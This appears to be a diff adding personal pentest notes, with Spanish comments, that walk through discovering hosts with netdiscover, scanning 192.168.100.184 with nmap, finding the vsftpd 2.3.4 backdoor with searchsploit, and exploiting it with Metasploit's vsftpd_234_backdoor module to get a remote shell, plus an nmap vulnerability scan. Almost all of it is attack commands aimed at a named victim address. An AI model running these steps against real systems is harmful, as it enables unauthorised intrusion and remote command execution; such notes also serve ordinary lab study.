@@ -1,0 +1,26 @@
+
+ifconfig
+sudo apt-get install netdiscover
+
+# ver dispositivos o host conectados
+sudo netdiscover
+
+# hacer escaneo hacia la ip y ver los servicios que se ejecutan 
+nmap -sV 192.168.100.184
+
+# herramienta que nos permite buscar exploits buscando por nombre y la version
+sudo apt install exploitdb
+searchsploit vsftpd 2.3.4
+
+# ya con la vulnerabilidad encontrada , podemos ejecutar comandos remotamente
+msfconsole
+search vsftpd # con la salida que nos da, vamos a utilizar el exploit
+use exploit/unix/ftp/vsftpd_234_backdoor
+show options # para ver las opciones que nos da
+set RHOSTS 192.168.100.184 # host remoto, la direccion ip de la victima
+run # se ejcuta el exploit
+pwd # se abre un shell, para comprobarlo damos pwd, de esta manera ya podemos poner comandos
+
+
+# escanea en busca de vulnerabilidades
+nmap -script=vuln 192.168.100.184
